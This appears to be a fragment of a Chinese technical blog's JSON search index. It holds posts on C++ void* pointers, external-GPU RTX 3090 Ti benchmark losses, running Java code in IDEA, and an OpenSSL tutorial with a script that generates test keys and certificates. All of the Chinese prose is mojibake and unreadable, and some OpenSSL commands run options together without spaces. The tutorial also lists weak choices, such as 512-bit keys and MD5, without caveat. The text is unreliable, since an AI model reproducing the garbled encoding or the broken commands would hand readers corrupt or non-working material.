å½“void*æŒ‡é’ˆ*ä½œä¸ºå‡½æ•°çš„è¾“å…¥å’Œè¾“å‡º*æ—¶ï¼Œè¡¨ç¤ºå¯ä»¥*æ¥å—ä»»æ„ç±»å‹çš„è¾“å…¥æŒ‡é’ˆå’Œè¾“å‡ºä»»æ„ç±»å‹çš„æŒ‡é’ˆ* void* test(void* a) &#123; return aï¼› &#125; int main() &#123; static int a = 5; int* pi = &amp;a; cout&lt;&lt;pi&lt;&lt;endl; //å€¼ä¸º0x100001060 cout&lt;&lt;test(pi)&lt;&lt;endl; //å€¼ä¸º0x100001060 cout&lt;&lt;test((void*)pi)&lt;&lt;endl; //å€¼ä¸º0x100001060 &#125; å¦‚æœå‡½æ•°çš„è¾“å…¥ç±»å‹ä¸ºvoid*ï¼Œåœ¨è°ƒç”¨æ—¶ç”±äºæ˜¯å€¼ä¼ é€’ï¼Œæ‰€ä»¥å‡½æ•°å®é™…æ¥æ”¶åˆ°çš„åº”è¯¥å°±æ˜¯ä¸€ä¸ªåœ°å€å€¼ã€‚è¿™ä¸ªå€¼å¯ä»¥æ˜¯ä»»æ„ç±»å‹ã€‚ int a = 5; int* pi = &amp;a; void* test() &#123; return pi; &#125; int main() &#123; cout&lt;&lt;test()&lt;&lt;endl; //å€¼ä¸º0x100001060 &#125; è¾“å‡ºæ—¶åŒæ ·ä¹Ÿæ˜¯å€¼ä¼ é€’ï¼Œå› æ­¤å¯ä»¥è¾“å‡ºä»»æ„ç±»å‹æŒ‡é’ˆæŒ‡å‘çš„åœ°å€ã€‚","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"C++","slug":"æŠ€æœ¯å‘/C","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/C/"}],"tags":[{"name":"C/C++","slug":"C-C","permalink":"https://www.sizaif.com/tags/C-C/"},{"name":"void*","slug":"void","permalink":"https://www.sizaif.com/tags/void/"}],"author":"sizaif"},{"title":"å¤–ç½®æ˜¾å¡å-3090ti-å†…å¤–å±3Dmarkè·‘åˆ†æµ‹è¯•","slug":"å¤–ç½®æ˜¾å¡å-3090ti-å†…å¤–å±3Dmarkè·‘åˆ†æµ‹è¯•","date":"2022-10-12T09:29:39.000Z","updated":"2022-10-12T10:08:35.000Z","comments":true,"path":"posts/ff9407ae/","link":"","permalink":"https://www.sizaif.com/posts/ff9407ae/","excerpt":"","text":"æ˜¾å¡åæµ‹è¯• ç¬”è®°æœ¬é›·ç”µ4æ¥å£ï¼Œ å¤–ç½®æ˜¾å¡å å¤–ç½®æ˜¾å¡ï¼š 3090ti æ˜Ÿè€€OC ç¬”è®°æœ¬é…ç½®ï¼š >è®¾å¤‡åç§° Zephyrus16 >å¤„ç†å™¨ 11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz 2.30 GHz >æœºå¸¦ RAM 40.0 GB (39.7 GB å¯ç”¨) >ç³»ç»Ÿç±»å‹ 64 ä½æ“ä½œç³»ç»Ÿ, åŸºäº x64 çš„å¤„ç†å™¨ >ç¬”å’Œè§¦æ§ æ²¡æœ‰å¯ç”¨äºæ­¤æ˜¾ç¤ºå™¨çš„ç¬”æˆ–è§¦æ§è¾“å…¥ windowsç‰ˆæœ¬ >ç‰ˆæœ¬ Windows 11 ä¸“ä¸šç‰ˆ >ç‰ˆæœ¬ 22H2 >å®‰è£…æ—¥æœŸ â€2022/â€10/â€4 >æ“ä½œç³»ç»Ÿç‰ˆæœ¬ 22621.525 >ä½“éªŒ Windows Feature Experience Pack 1000.22634.1000.0 3dmarkè·‘åˆ† Time Spy Extreme-4K 4K Dircetx12 å¤–æ¥4kæ˜¾ç¤ºå™¨ https://view.inews.qq.com/a/20220615A04T5I00 åœ¨3DMarkçš„Time Spy Extremeï¼ˆ4Kæ¸²æŸ“åˆ†è¾¨ç‡ï¼‰æµ‹è¯•ä¸­ï¼Œå½±é©°RTX 3090 Tiæ˜Ÿæ›œOCå–å¾—äº†9813åˆ†çš„æˆç»©ï¼Œå…¶ä¸­æ˜¾å¡åˆ†æ•°ä¸º11199ã€‚ å¤§çº¦æŸè€—ï¼š (11199-9812)/11199 = 12% Fire Strike Ultra-4K 4k DirectX 11 å¤–æ¥4kæ˜¾ç¤ºå™¨ https://view.inews.qq.com/a/20220615A04T5I00 åœ¨3DMarkçš„Fire Strike Ultraï¼ˆ4Kæ¸²æŸ“åˆ†è¾¨ç‡ï¼‰æµ‹è¯•é¡¹ç›®ä¸­ï¼Œå½±é©°RTX 3090 Tiæ˜Ÿæ›œOCå–å¾—äº†14159åˆ†çš„æˆç»©ï¼Œå…¶ä¸­æ˜¾å¡åˆ†æ•°ä¸º14158ã€‚ å¤§çº¦æŸè€—ï¼šï¼ˆ14158-11336)/14158 = 20% Port Royal-4K å¤–æ¥4kæ˜¾ç¤ºå™¨ Time Spy- 2K å¤–æ¥4kæ˜¾ç¤ºå™¨ (21784-17445)/21784 = 19.9% å†…å± https://view.inews.qq.com/a/20220615A04T5I00 åœ¨3DMarkçš„Time Spyï¼ˆ2Kæ¸²æŸ“åˆ†è¾¨ç‡ï¼‰æµ‹è¯•ä¸­ï¼Œå½±é©°RTX 3090 Tiæ˜Ÿæ›œOCå–å¾—äº†19449åˆ†çš„æˆç»©ï¼Œå…¶ä¸­æ˜¾å¡åˆ†æ•°ä¸º21784ã€‚ æ€§èƒ½æŸè€—ï¼š(21784-12295) /21784 = 43% Fire Strike-2K å¤–æ¥4kæ˜¾ç¤ºå™¨ åœ¨3DMarkçš„Fire Strike Extremeï¼ˆ2Kæ¸²æŸ“åˆ†è¾¨ç‡ï¼‰æµ‹è¯•é¡¹ç›®ä¸­ï¼Œå½±é©°RTX 3090 Tiæ˜Ÿæ›œOCå–å¾—äº†25551åˆ†çš„æˆç»©ï¼Œå…¶ä¸­æ˜¾å¡åˆ†æ•°ä¸º27375ã€‚ æŸè€—ï¼š(27375-17445)/27375 = 36% å†…å± åœ¨3DMarkçš„Fire Strike Extremeï¼ˆ2Kæ¸²æŸ“åˆ†è¾¨ç‡ï¼‰æµ‹è¯•é¡¹ç›®ä¸­ï¼Œå½±é©°RTX 3090 Tiæ˜Ÿæ›œOCå–å¾—äº†25551åˆ†çš„æˆç»©ï¼Œå…¶ä¸­æ˜¾å¡åˆ†æ•°ä¸º27375ã€‚ æŸè€—ï¼š(27375-16496)/27375 = 39%","categories":[],"tags":[{"name":"3090ti","slug":"3090ti","permalink":"https://www.sizaif.com/tags/3090ti/"},{"name":"å¤–ç½®æ˜¾å¡å","slug":"å¤–ç½®æ˜¾å¡å","permalink":"https://www.sizaif.com/tags/%E5%A4%96%E7%BD%AE%E6%98%BE%E5%8D%A1%E5%9D%9E/"}],"author":"sizaif"},{"title":"Idea Javaç›´æ¥ä»£ç æµ‹è¯•,è·³è¿‡jaråŒ…ç¼–è¯‘","slug":"idea-javaç›´æ¥ä»£ç æµ‹è¯•-è·³è¿‡jaråŒ…ç¼–è¯‘","date":"2022-08-21T13:27:40.000Z","updated":"2022-08-21T13:38:07.000Z","comments":true,"path":"posts/568a27eb/","link":"","permalink":"https://www.sizaif.com/posts/568a27eb/","excerpt":"","text":"IDEA ç›´æ¥ä»£ç æµ‹è¯•ï¼Œ ä¸ä½¿ç”¨jaråŒ… tips æ¯æ¬¡å†™å®Œä»£ç åï¼Œéƒ½å¾—éœ€è¦ç”¨maven packageä¸€ä¸‹å¤ªéº»çƒ¦å•¦ è¿˜å¥½æˆ‘ä»¬æœ‰å¼ºå¤§çš„IDEA (â—â€™â—¡â€™â—) ç®€å•ç‰›åˆ€å°è¯• æœ€ç®€å•çš„æœ¬åœ°æµ‹è¯• æ³¨æ„program argument é‡Œçš„è·¯å¾„æ˜¯ç›¸å¯¹äºworking directory ç„¶åå°±å¯ä»¥æ¬¢å¿«çš„ä»£ç é‡Œç›´æ¥æµ‹è¯•å•¦","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Win","slug":"Win","permalink":"https://www.sizaif.com/navigation/categories/Win/"}],"tags":[{"name":"idea","slug":"idea","permalink":"https://www.sizaif.com/tags/idea/"}],"author":"sizaif"},{"title":"OpenSSL ç”Ÿæˆå…¬ç§é’¥ä¸è‡ªç­¾åè¯ä¹¦ç›¸å…³çŸ¥è¯†","slug":"OpenSSL-ç”Ÿæˆå…¬ç§é’¥ä¸è‡ªç­¾åè¯ä¹¦ç›¸å…³çŸ¥è¯†","date":"2022-08-03T14:24:15.000Z","updated":"2022-11-07T04:30:55.000Z","comments":true,"path":"posts/210154ee/","link":"","permalink":"https://www.sizaif.com/posts/210154ee/","excerpt":"","text":"OpenSSL æ•™ç¨‹ 2022-07-30 09:41:34 sizaif åŸºç¡€çŸ¥è¯† .crt .pem .key PEM - Privacy Enhanced Mail ä»¥â€œ-----BEGINâ€¦â€å¼€å¤´ï¼Œâ€œ-----ENDâ€¦â€ç»“å°¾ï¼Œå†…å®¹æ˜¯ BASE64 ç¼–ç ã€‚ PEMæ ¼å¼æ˜¯è¯ä¹¦é¢å‘æœºæ„é¢å‘è¯ä¹¦çš„æœ€å¸¸è§æ ¼å¼.PEMè¯ä¹¦é€šå¸¸å…·æœ‰æ‰©å±•åï¼Œä¾‹**.pemï¼Œ.crtï¼Œ.cerå’Œ.key**ã€‚å®ƒä»¬æ˜¯Base64ç¼–ç çš„ASCIIæ–‡ä»¶ï¼ŒåŒ…å«â€œ----- BEGIN CERTIFICATE -----â€å’Œâ€œ----- END CERTIFICATE -----â€è¯­å¥ã€‚æœåŠ¡å™¨è¯ä¹¦ï¼Œä¸­é—´è¯ä¹¦å’Œç§é’¥éƒ½å¯ä»¥æ”¾å…¥PEMæ ¼å¼ã€‚ openssl x509 -in certificate.pem -text -noout #pem DER - Distinguished Encoding Rules DERæ ¼å¼åªæ˜¯è¯ä¹¦çš„äºŒè¿›åˆ¶å½¢å¼ï¼Œè€Œä¸æ˜¯ASCII PEMæ ¼å¼ã€‚å®ƒæœ‰æ—¶ä¼šæœ‰**.derçš„æ–‡ä»¶æ‰©å±•åï¼Œä½†å®ƒçš„æ–‡ä»¶æ‰©å±•åé€šå¸¸æ˜¯.ceræ‰€ä»¥åˆ¤æ–­DER .ceræ–‡ä»¶å’ŒPEM .ceræ–‡ä»¶ä¹‹é—´åŒºåˆ«çš„å”¯ä¸€æ–¹æ³•æ˜¯åœ¨æ–‡æœ¬ç¼–è¾‘å™¨ä¸­æ‰“å¼€å®ƒå¹¶æŸ¥æ‰¾BEGIN / ENDè¯­å¥ã€‚æ‰€æœ‰ç±»å‹çš„è¯ä¹¦å’Œç§é’¥éƒ½å¯ä»¥ç”¨DERæ ¼å¼ç¼–ç ã€‚DERé€šå¸¸ä¸Javaå¹³å°ä¸€èµ·ä½¿ç”¨ï¼Œ**Java å’Œ Windows æœåŠ¡å™¨åå‘äºä½¿ç”¨è¿™ç§ç¼–ç æ ¼å¼ã€‚SSLè½¬æ¢å™¨åªèƒ½å°†è¯ä¹¦è½¬æ¢ä¸ºDERæ ¼å¼ openssl x509 -in certificate.der -inform der -text -noout #der CRT æ˜¯ certificate çš„ä¸‰ä¸ªå­—æ¯ï¼Œå…¶å®è¿˜æ˜¯è¯ä¹¦çš„æ„æ€ã€‚å¸¸è§äº UNIX ç³»ç»Ÿï¼Œæœ‰å¯èƒ½æ˜¯ PEM ç¼–ç ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯ DER ç¼–ç ï¼Œå¤§å¤šæ•°åº”è¯¥æ˜¯ PEM ç¼–ç ï¼Œç›¸ä¿¡ä½ å·²ç»çŸ¥é“æ€ä¹ˆè¾¨åˆ«ã€‚ CER è¿˜æ˜¯ certificateï¼Œè¿˜æ˜¯è¯ä¹¦ã€‚å¸¸è§äº Windows ç³»ç»Ÿï¼ŒåŒæ ·çš„å¯èƒ½æ˜¯ PEM ç¼–ç ï¼Œä¹Ÿå¯èƒ½æ˜¯ DER ç¼–ç ï¼Œå¤§å¤šæ•°åº”è¯¥æ˜¯ DER ç¼–ç ã€‚ KEY é€šå¸¸ç”¨æ¥å­˜æ”¾ä¸€ä¸ªå…¬é’¥æˆ–è€…ç§é’¥ï¼Œå¹¶é X.509 è¯ä¹¦ã€‚ç¼–ç åŒæ ·çš„ï¼Œå¯èƒ½æ˜¯ PEMï¼Œä¹Ÿå¯èƒ½æ˜¯ DER openssl rsa -in mykey.key -text -noout # pem openssl rsa -in mykey.key -text -noout -inform der # der CSR Certificateï¼ŒSigning Requestï¼Œå³è¯ä¹¦ç­¾åè¯·æ±‚ã€‚è¿™ä¸ªå¹¶ä¸æ˜¯è¯ä¹¦ï¼Œè€Œæ˜¯å‘æƒå¨è¯ä¹¦é¢å‘æœºæ„è·å¾—ç­¾åè¯ä¹¦çš„ç”³è¯·ï¼Œå…¶æ ¸å¿ƒå†…å®¹æ˜¯ä¸€ä¸ªå…¬é’¥ï¼ˆå½“ç„¶è¿˜é™„å¸¦äº†ä¸€äº›åˆ«çš„ä¿¡æ¯ï¼‰ã€‚åœ¨ç”Ÿæˆè¿™ä¸ªç”³è¯·çš„æ—¶å€™ï¼ŒåŒæ—¶ä¹Ÿä¼šç”Ÿæˆä¸€ä¸ªç§é’¥ï¼Œç§é’¥è¦è‡ªå·±ä¿ç®¡å¥½ã€‚åšè¿‡ iOS APP çš„æœ‹å‹éƒ½åº”è¯¥çŸ¥é“æ˜¯ï¼Œæ€ä¹ˆå‘è‹¹æœç”³è¯·å¼€å‘è€…è¯ä¹¦çš„å§ã€‚ openssl req -noout -text -in my.csr # æŸ¥çœ‹å¸®åŠ© openssl help genrsa å¹³æ—¶ä¸»è¦ç”¨æ¥ç”Ÿæˆç§é’¥ï¼Œé€‰æ‹©ä½¿ç”¨çš„ç®—æ³•ã€å¯¹ç§°åŠ å¯†å¯†ç å’Œç§é’¥é•¿åº¦æ¥ç”Ÿæˆç§é’¥ openssl genrsa [args] [numbits] # ã€æ›´å¤šå‚æ•°æŸ¥çœ‹ï¼šopenssl genrsa -helpã€‘ args1 å¯¹ç”Ÿæˆçš„ç§é’¥æ–‡ä»¶æ˜¯å¦è¦ä½¿ç”¨åŠ å¯†ç®—æ³•è¿›è¡Œå¯¹ç§°åŠ å¯†: -des : CBCæ¨¡å¼çš„DESåŠ å¯† -des3 : CBCæ¨¡å¼çš„3DESåŠ å¯† -aes128 : CBCæ¨¡å¼çš„AES128åŠ å¯† -aes192 : CBCæ¨¡å¼çš„AES192åŠ å¯† -aes256 : CBCæ¨¡å¼çš„AES256åŠ å¯† args2 å¯¹ç§°åŠ å¯†å¯†ç  -passout passwords å…¶ä¸­passwordsä¸ºå¯¹ç§°åŠ å¯†(desã€3desã€aes)çš„å¯†ç (ä½¿ç”¨è¿™ä¸ªå‚æ•°å°±çœå»äº†consoleäº¤äº’æç¤ºè¾“å…¥å¯†ç çš„ç¯èŠ‚) args3 è¾“å‡ºæ–‡ä»¶ -out file : è¾“å‡ºè¯ä¹¦ç§é’¥æ–‡ä»¶ [numbits]: å¯†é’¥é•¿åº¦ï¼Œç†è§£ä¸ºç§é’¥é•¿åº¦ ç”Ÿæˆä¸€ä¸ª2048ä½çš„RSAç§é’¥ï¼Œå¹¶ç”¨des3åŠ å¯†(å¯†ç ä¸º123456)ï¼Œä¿å­˜ä¸ºserver.keyæ–‡ä»¶ openssl genrsa -des3 -passout pass:123456 -out server.key 2048 // -des3 æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°args1ï¼› // -passout pass:123456 æ˜¯ç¬¬äºŒä¸ªå‚æ•°å†™æ³• args2 // -out server.key ç¬¬ä¸‰ä¸ªå‚æ•°args3ï¼› // 2048 æœ€åä¸€ä¸ª[numbits]å‚æ•° req reqçš„åŸºæœ¬åŠŸèƒ½ä¸»è¦æœ‰ä¸¤ä¸ªï¼šç”Ÿæˆè¯ä¹¦è¯·æ±‚å’Œç”Ÿæˆè‡ªç­¾åè¯ä¹¦ï¼Œå½“ç„¶è¿™å¹¶ä¸æ˜¯å…¶å…¨éƒ¨åŠŸèƒ½ï¼Œä½†æ˜¯è¿™ä¸¤ä¸ªæœ€ä¸ºå¸¸è§ï¼› å¸¸è§ä½¿ç”¨æ–¹æ³•ï¼š openssl req [args] outfile ä¸»è¦å‚æ•°ï¼šã€æ›´å¤šå‚æ•°æŸ¥çœ‹ï¼šopenssl req -helpã€‘ args1 æ˜¯è¾“å…¥è¾“å…¥æ–‡ä»¶æ ¼å¼ï¼š-inform arg -inform DER ä½¿ç”¨è¾“å…¥æ–‡ä»¶æ ¼å¼ä¸ºDER -inform PEM ä½¿ç”¨è¾“å…¥æ–‡ä»¶æ ¼å¼ä¸ºPEM args2 è¾“å‡ºæ–‡ä»¶æ ¼å¼:-outform arg -outform DER ä½¿ç”¨è¾“å‡ºæ–‡ä»¶æ ¼å¼ä¸ºDER -outform PEM ä½¿ç”¨è¾“å‡ºæ–‡ä»¶æ ¼å¼ä¸ºPEM args3 æ˜¯å¾…å¤„ç†æ–‡ä»¶ -in inputfilepath args4 å¾…è¾“å‡ºæ–‡ä»¶ -out outputfilepath args5 ç”¨äºç­¾åå¾…ç”Ÿæˆçš„è¯·æ±‚è¯ä¹¦çš„ç§é’¥æ–‡ä»¶çš„è§£å¯†å¯†ç  -passin passwords args6 ç”¨äºç­¾åå¾…ç”Ÿæˆçš„è¯·æ±‚è¯ä¹¦çš„ç§é’¥æ–‡ä»¶ -key file args7æŒ‡å®šè¾“å…¥å¯†é’¥çš„ç¼–ç æ ¼å¼ -keyform arg -keyform DER -keyform NET -keyform PEM args8 ç”Ÿæˆæ–°çš„è¯ä¹¦è¯·æ±‚ -new args9è¾“å‡ºä¸€ä¸ªX509æ ¼å¼çš„è¯ä¹¦,ç­¾åè¯ä¹¦æ—¶ä½¿ç”¨ -x509 args10ä½¿ç”¨X509ç­¾åè¯ä¹¦çš„æœ‰æ•ˆæ—¶é—´ -days // -days 3650 æœ‰æ•ˆæœŸ10å¹´ args11ç”Ÿæˆä¸€ä¸ªbitsé•¿åº¦çš„RSAç§é’¥æ–‡ä»¶ï¼Œç”¨äºç­¾å‘ã€ç”Ÿæˆç§é’¥ã€å¹¶ç”Ÿæˆè‡ªç­¾åè¯ä¹¦ã€‘ -newkey rsa:bits args12è®¾ç½®HASHç®—æ³•-[digest]ã€ç”Ÿæˆç§é’¥æŒ‡å®šçš„hashæ‘˜è¦ç®—æ³•ã€‘ -md5 -sha1 // é«˜ç‰ˆæœ¬æµè§ˆå™¨å¼€å§‹ä¸ä¿¡ä»»è¿™ç§ç®—æ³• -md2 -mdc2 -md4 args13æŒ‡å®šopensslé…ç½®æ–‡ä»¶,å¾ˆå¤šå†…å®¹ä¸å®¹æ˜“é€šè¿‡å‚æ•°é…ç½®ï¼Œå¯ä»¥æŒ‡å®šé…ç½®æ–‡ä»¶ -config filepath args14 æ˜¾ç¤ºæ ¼å¼txtã€ç”¨äºæŸ¥çœ‹è¯ä¹¦ã€ç§é’¥ä¿¡æ¯ã€‘ -text ä½¿ç”¨çš„æ¡ˆä¾‹ï¼šåˆ©ç”¨ç§é’¥ç”Ÿæˆè¯ä¹¦è¯·æ±‚csr openssl req -new -key server.key -out server.csr ä½¿ç”¨æ¡ˆä¾‹ï¼šåˆ©ç”¨ç§é’¥ç”Ÿæˆè‡ªç­¾åè¯ä¹¦ openssl req -new -x509 -days 3650 -key ca.key -out ca.crt ç”Ÿæˆç§é’¥ genrsa genkeyè¿™ä¸¤ç§æ–¹æ³•éƒ½åˆ›å»ºRSAå¯†é’¥ï¼Œå°½ç®¡æ ¼å¼ä¸åŒã€‚genrsaè¾“å‡ºpkcs# 1æ ¼å¼çš„RSAå¯†é’¥ï¼Œè€Œgenpkeyè¾“å‡ºä¸€ä¸ªæ›´é€šç”¨çš„å®¹å™¨ï¼Œå¯ä»¥ç®¡ç†ä¸åŒç±»å‹çš„å¯†é’¥ï¼ˆRSAã€DSAã€DHã€ECç­‰ï¼‰ genrsa openssl genrsa [args] [numbits] args1 å¯¹ç”Ÿæˆçš„ç§é’¥æ–‡ä»¶æ˜¯å¦è¦ä½¿ç”¨åŠ å¯†ç®—æ³•è¿›è¡Œå¯¹ç§°åŠ å¯†: -des : CBCæ¨¡å¼çš„DESåŠ å¯† -des3 : CBCæ¨¡å¼çš„3DESåŠ å¯† -aes128 : CBCæ¨¡å¼çš„AES128åŠ å¯† -aes192 : CBCæ¨¡å¼çš„AES192åŠ å¯† -aes256 : CBCæ¨¡å¼çš„AES256åŠ å¯† args2 å¯¹ç§°åŠ å¯†å¯†ç  -passout passwords å…¶ä¸­passwordsä¸ºå¯¹ç§°åŠ å¯†(desã€3desã€aes)çš„å¯†ç (ä½¿ç”¨è¿™ä¸ªå‚æ•°å°±çœå»äº†consoleäº¤äº’æç¤ºè¾“å…¥å¯†ç çš„ç¯èŠ‚) args3 è¾“å‡ºæ–‡ä»¶ -out file : è¾“å‡ºè¯ä¹¦ç§é’¥æ–‡ä»¶ [numbits]: å¯†é’¥é•¿åº¦ï¼Œç†è§£ä¸ºç§é’¥é•¿åº¦ Usage: genrsa [options] Valid options are: -help Display this summary -3 Use 3 for the E value -F4 Use F4 (0x10001) for the E value -f4 Use F4 (0x10001) for the E value -out outfile Output the key to specified file -rand val Load the file(s) into the random number generator -writerand outfile Write random data to the specified file -passout val Output file pass phrase source -* Encrypt the output with any supported cipher -engine val Use engine, possibly a hardware device -primes +int Specify number of primes ä¾‹å¦‚ç”Ÿæˆä¸€ä¸ª2048ä½çš„RSAç§é’¥ï¼Œå¹¶ç”¨des3åŠ å¯†(å¯†ç ä¸º123456)ï¼Œä¿å­˜ä¸ºrsa_private_key.pemæ–‡ä»¶ openssl genrsa -des3 -passout pass:123456 -out rsa_private_key.pem 2048 // -des3 æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°args1ï¼› // -passout pass:123456 æ˜¯ç¬¬äºŒä¸ªå‚æ•°å†™æ³• args2 // -out server.key ç¬¬ä¸‰ä¸ªå‚æ•°args3ï¼› // 2048 æœ€åä¸€ä¸ª[numbits]å‚æ•° ç§é’¥è½¬â¾®åŠ å¯† openssl rsa -in rsa_private_key.pem -passin pass:123456 -out rsa_private.key ç§é’¥è½¬åŠ å¯† openssl rsa -in rsa_private.key -aes256 -passout pass:111111 -out rsa_aes_private.key ç§é’¥PEMè½¬DER openssl rsa -in rsa_private.key -outform der-out rsa_aes_private.der genkey genpkeyå‘½ä»¤ç”¨äºäº§ç”Ÿå„ç§å¯†é’¥ï¼ˆRSAã€DSAã€DHã€ECç­‰ï¼‰çš„ç§é’¥ Usage: genpkey [options] Valid options are: -help Display this summary -out outfile Output file -outform PEM|DER output format (DER or PEM) -pass val Output file pass phrase source -paramfile infile Parameters file -algorithm val The public key algorithm -pkeyopt val Set the public key algorithm option as opt:value -genparam Generate parameters, not key -text Print the in text -* Cipher to use to encrypt the key -engine val Use engine, possibly a hardware device Order of options may be important! See the documentation. ç”ŸæˆDSAç®—æ³•çš„ç§é’¥ openssl genpkey -genparam -algorithm DSA -out dsap2048.pem -pkeyopt dsa_paramgen_bits:2048 ç”ŸæˆRSAç®—æ³•çš„ç§é’¥ openssl genpkey -algorithm RSA -out rsa2048_key.pem -pkeyopt rsa_keygen_bits:2048 ç”Ÿæˆå…¬é’¥ Usage: rsa [options] Valid options are: -help Display this summary -inform format Input format, one of DER PEM -outform format Output format, one of DER PEM PVK -in val Input file -out outfile Output file -pubin Expect a public key in input file -pubout Output a public key -passout val Output file pass phrase source -passin val Input file pass phrase source -RSAPublicKey_in Input is an RSAPublicKey -RSAPublicKey_out Output is an RSAPublicKey -noout Don't print key out -text Print the key in text -modulus Print the RSA key modulus -check Verify key consistency -* Any supported cipher -pvk-strong Enable 'Strong' PVK encoding level (default) -pvk-weak Enable 'Weak' PVK encoding level -pvk-none Don't enforce PVK encoding -engine val Use engine, possibly a hardware device å…¬é’¥ç”±ç§é’¥è¿ç®—ç”Ÿæˆ openssl rsa -in rsa_private_key.pem -pubout -out rsa_public_key.pem ç”Ÿæˆâ¾ƒç­¾åè¯ä¹¦ â½£æˆ RSA ç§é’¥å’Œâ¾ƒç­¾åè¯ä¹¦ openssl req -newkey rsa:2048-nodes -keyout rsa_private.key -x509 -days 365-out cert.crt # reqæ˜¯è¯ä¹¦è¯·æ±‚çš„â¼¦å‘½ä»¤ï¼Œ # -newkey rsa:2048 -keyout private_key.pem è¡¨â½°â½£æˆç§é’¥(PKCS8æ ¼å¼)ï¼Œ # -nodes è¡¨â½°ç§é’¥ä¸åŠ å¯†ï¼Œè‹¥ä¸å¸¦å‚æ•°å°†æâ½°è¾“â¼Šå¯†ç ï¼› # -x509è¡¨â½°è¾“å‡ºè¯ä¹¦ï¼Œ # -days365 ä¸ºæœ‰æ•ˆæœŸï¼Œæ­¤åæ ¹æ®æâ½°è¾“â¼Šè¯ä¹¦æ‹¥æœ‰è€…ä¿¡æ¯ï¼› # è‹¥æ‰§â¾â¾ƒåŠ¨è¾“â¼Šï¼Œå¯ä½¿â½¤-subjé€‰é¡¹ï¼š openssl req -newkey rsa:2048-nodes -keyout rsa_private.key -x509 -days 365-out cert.crt -subj \"/C=CN/ST=GD/L=SZ/O=vihoo/OU=dev/CN=vivo.com/emailAddress=yy@vivo.com\" ä½¿â½¤å·²æœ‰RSA ç§é’¥â½£æˆâ¾ƒç­¾åè¯ä¹¦ openssl req -key rsa_private.key -new -x509 -days 365 -out cert.crt # -new æŒ‡â½£æˆè¯ä¹¦è¯·æ±‚ åŠ ä¸Š-x509 è¡¨â½°ç›´æ¥è¾“å‡ºè¯ä¹¦ # -key æŒ‡å®šç§é’¥â½‚ä»¶ï¼Œå…¶ä½™é€‰é¡¹ä¸ä¸Šè¿°å‘½ä»¤ç›¸åŒ â½£æˆç­¾åè¯·æ±‚åŠCA ç­¾å ä½¿â½¤ RSAç§é’¥â½£æˆ CSR ç­¾åè¯·æ±‚ openssl genrsa -aes256 -passout pass:111111 -out server.key 2048 openssl req -new -key server.key -out server.csr æ­¤åè¾“â¼Šå¯†ç ã€serverè¯ä¹¦ä¿¡æ¯å®Œæˆï¼Œä¹Ÿå¯ä»¥å‘½ä»¤â¾æŒ‡å®šå„ç±»å‚æ•° openssl req -new-key server.key -passin pass:111111-out server.csr -subj \"/C=CN/ST=GD/L=SZ/O=vihoo/OU=dev/CN=vivo.com/emailAddress=yy@vivo.com\" æ­¤æ—¶â½£æˆçš„ csrç­¾åè¯·æ±‚â½‚ä»¶å¯æäº¤â¾„ CAè¿›â¾ç­¾å‘ ä½¿â½¤ CA è¯ä¹¦åŠCAå¯†é’¥ å¯¹è¯·æ±‚ç­¾å‘è¯ä¹¦è¿›â¾ç­¾å‘ï¼Œâ½£æˆ x509è¯ä¹¦ openssl x509 -req -days 3650-in server.csr -CA ca.crt -CAkey ca.key -passin pass:111111-CAcreateserial -out server.crt å…¶ä¸­ CAxxx é€‰é¡¹â½¤äºæŒ‡å®šCA å‚æ•°è¾“â¼Š s_client ä¸ s_server ç›¸äº’é€šä¿¡ TODO: Code #!/bin/bash # ç”ŸæˆDESç®—æ³•ç§é’¥ å¹¶ç”Ÿæˆè‡ªç­¾åè¯ä¹¦ for len in 512 1024 2048 3072 do openssl genpkey -genparam -algorithm DSA -out dsap$&#123;len&#125;.pem -pkeyopt dsa_paramgen_bits:$&#123;len&#125; openssl genpkey -paramfile dsap$&#123;len&#125;.pem -out dsa$&#123;len&#125;_key.pem openssl req -key dsa$&#123;len&#125;_key.pem -new -x509 -days 2000 -out dsa$&#123;len&#125;_cert.pem -subj \"/CN=tls-attacker.com\" done # ç”ŸæˆRSAç®—æ³•ç§é’¥ å¹¶ç”Ÿæˆè‡ªç­¾åè¯ä¹¦ for len in 512 1024 2048 4096 do openssl genpkey -algorithm RSA -out rsa$&#123;len&#125;_key.pem -pkeyopt rsa_keygen_bits:$&#123;len&#125; openssl req -key rsa$&#123;len&#125;_key.pem -new -x509 -days 2000 -out rsa$&#123;len&#125;_cert.pem -subj \"/CN=tls-attacker.com\" done # ç”ŸæˆECæ¤­åœ†ç®—æ³•çš„ç§é’¥ å¹¶ç”Ÿæˆè‡ªç­¾åè¯ä¹¦ for named_curve in secp160k1 secp160r1 secp160r2 secp192k1 secp224k1 secp224r1 secp256k1 secp384r1 secp521r1 sect163k1 sect163r1 sect163r2 sect193r1 sect193r2 sect233k1 sect233r1 sect239k1 sect283k1 sect283r1 sect409k1 sect409r1 sect571k1 sect571r1 do openssl ecparam -name $&#123;named_curve&#125; -genkey -out ec_$&#123;named_curve&#125;_key.pem openssl req -key ec_$&#123;named_curve&#125;_key.pem -new -x509 -days 2000 -out ec_$&#123;named_curve&#125;_cert.pem -subj \"/CN=tls-attacker.com\" done # openssl req -x509 -new -nodes -extensions v3_ca -key rsa2048_key.pem -days 2000 -out rsa_ca.pem -sha256 -subj \"/CN=TLS-Attacker CA\" openssl req -x509 -new -nodes -extensions v3_ca -key dsa1024_key.pem -days 2000 -out dsa_ca.pem -sha256 -subj \"/CN=TLS-Attacker CA\" # ç”Ÿæˆ dhå‚æ•° dhparam.pem openssl dhparam -out dhparam.pem 1024 # æ ¹æ®dhå‚æ•° ç”Ÿæˆ dhç§é’¥ openssl genpkey -paramfile dhparam.pem -out dhkey.pem # pkeyå‘½ä»¤ç”¨äºå¤„ç†å…¬é’¥æˆ–ç§é’¥ï¼Œ # æ ¹æ®dhç§é’¥ç”Ÿæˆdhå…¬é’¥ openssl pkey -in dhkey.pem -pubout -out dhpubkey.pem # 